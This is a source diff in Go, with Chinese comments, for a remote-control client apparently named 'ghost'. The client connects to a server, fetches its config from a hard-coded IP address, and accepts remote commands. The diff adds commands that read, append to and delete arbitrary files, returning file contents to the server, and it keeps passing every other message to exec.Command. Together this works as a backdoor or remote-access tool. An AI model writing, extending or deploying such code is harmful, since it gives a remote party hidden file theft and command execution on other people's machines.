@@ -5,9 +5,12 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"os"
 	"os/exec"
 	"strings"
 )
+
+var Conn net.Conn
 
 func initRescue() {
 	//获取server地址
@@ -31,11 +34,9 @@ mkConn:
 	wg.Done()
 }
 
-var writer *bufio.Writer
-
 func handleConn(conn net.Conn) {
+	Conn = conn
 	reader := bufio.NewReader(conn)
-	writer = bufio.NewWriter(conn)
 	//读取name
 	if !Exists("ghostjc.ini") {
 		err := DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")
@@ -52,7 +53,7 @@ func handleConn(conn net.Conn) {
 	//发送name数据
 	name, _ := cfg.Get("name")
 	fmt.Println("name:" + name)
-	conn.Write([]byte("info n" + name + "\n"))
+	conn.Write([]byte("info r" + name + "\n"))
 	fmt.Println("name sent")
 	//循环接收信息
 readMsg:
@@ -67,6 +68,59 @@ readMsg:
 		}
 		spt := strings.Split(string(msg), " ")
 		switch spt[0] {
+		case "help":
+			WriteToServer("help test")
+			continue readMsg
+		case "append":
+			if len(spt) < 2 {
+				WriteToServer("append <file> [string...]")
+				continue
+			}
+			fileStr := ""
+			for index, part := range spt {
+				if index < 2 {
+					continue
+				}
+				fileStr += part
+				if index == len(spt)-1 {
+					break
+				} else {
+					fileStr += " "
+				}
+			}
+			if !Exists(spt[1]) {
+				WriteToServer("new file")
+				WriteFile(spt[1], fileStr)
+			} else {
+				strBefore, _ := ReadFile(spt[1])
+				WriteFile(spt[1], strBefore+fileStr+"\n")
+			}
+			WriteToServer("write \"" + fileStr + "\" to file \"" + spt[1] + "\"")
+			continue readMsg
+		case "del":
+			if len(spt) < 2 {
+				WriteToServer("del <file>")
+				continue readMsg
+			}
+			err := os.Remove(spt[1])
+			if err != nil {
+				WriteToServer(err.Error())
+			} else {
+				WriteToServer("del file " + spt[1])
+			}
+			continue
+		case "read":
+			if len(spt) < 2 {
+				WriteToServer("read <file>")
+				continue
+			}
+			fileStr, err := ReadFile(spt[1])
+			if err != nil {
+				WriteToServer("failed " + err.Error())
+			} else {
+				WriteToServer("=======" + spt[1] + "=======\n" + fileStr + "\n=====================")
+			}
+			continue
 		case "launch":
 			err = launchClient()
 			if err != nil {
@@ -113,8 +167,13 @@ readMsg:
 				WriteToServer(err.Error())
 			}
 			continue readMsg
+		case "~alive":
+			WriteToServer("~alives")
+			fmt.Println("beat")
+			continue
 		}
 		//没有任何操作
+		//fmt.Println("exec "+string(msg))
 		c := exec.Command(string(msg))
 		err = c.Start()
 		if err != nil {
@@ -123,5 +182,5 @@ readMsg:
 	}
 }
 func WriteToServer(msg string) (int, error) {
-	return writer.Write([]byte(msg + "\n"))
+	return Conn.Write([]byte(msg + "\n"))
 }
